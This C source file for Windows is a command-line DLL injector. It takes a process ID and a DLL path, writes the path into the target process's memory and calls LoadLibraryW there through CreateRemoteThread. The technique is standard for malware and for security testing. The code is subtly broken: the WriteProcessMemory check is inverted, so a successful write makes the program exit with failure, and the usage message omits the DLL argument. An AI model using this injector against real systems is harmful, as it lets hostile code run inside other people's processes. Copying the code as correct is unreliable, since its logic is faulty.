#include<stdio.h>
#include<windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
HMODULE hKernel32 = NULL;
LPVOID rBuffer = NULL;

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("%s Usage: %s <PID>\n", e, argv[0]);
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);
	char* dllPathArg = argv[2];
	int dllPathlen = strlen(dllPathArg)+1;
	wchar_t* dllPath = (wchar_t*)malloc(dllPathlen * sizeof(wchar_t));
	if (dllPath == NULL) {
		printf("%s Memory allocation failed for DLL path\n", e);
		return EXIT_FAILURE;
	}
	mbstowcs(dllPath, dllPathArg, dllPathlen);
	printf("%s Attempting to open process with PID: %d\n", i, PID);

	if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
		printf("%s DLL file does not exist: %ls\n", e, dllPath);
		free(dllPath);
		return EXIT_FAILURE;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("%s Failed to open process. Error code: %d\n", e, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Successfully opened process with PID: %d\n", k, PID);

	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%s Allocated memory in target process at address: %p\n", k, rBuffer);

	if (rBuffer == NULL) {
		printf("%s Failed to allocate memory in target process\n", e);
		CloseHandle(hProcess);
		free(dllPath);
		return EXIT_FAILURE;
	}

	if (WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL)){
		printf("%s Written DLL path to target process memory\n", k);
		VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		free(dllPath);
		return EXIT_FAILURE;
	}
	printf("%s Successfully written DLL path to target process memory\n", k);

	hKernel32 = GetModuleHandleW(L"Kernel32");
	if (hKernel32 == NULL) {
		printf("%s Failed to get handle to Kernel32.dll\n", e);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Successfully obtained handle to Kernel32.dll\n", k);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s Address of LoadLibraryW: %p\n", k, startThis);
	if (startThis == NULL) {
		printf("%s Failed to get address of LoadLibraryW\n", e);
		VirtualFreeEx(hProcess, rBuffer, dllPathSize, MEM_DECOMMIT);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);
	if (hThread == NULL) {
		printf("%s Failed to create remote thread. Error code: %d\n", e, GetLastError());
		VirtualFreeEx(hProcess, rBuffer, dllPathSize, MEM_DECOMMIT);
		CloseHandle(hProcess);
		free(dllPath);
		return EXIT_FAILURE;
	}
	printf("%s Successfully created remote thread with TID: %d\n", k, TID);
	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, rBuffer, dllPathSize, MEM_DECOMMIT);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	free(dllPath);

	return EXIT_SUCCESS;
}
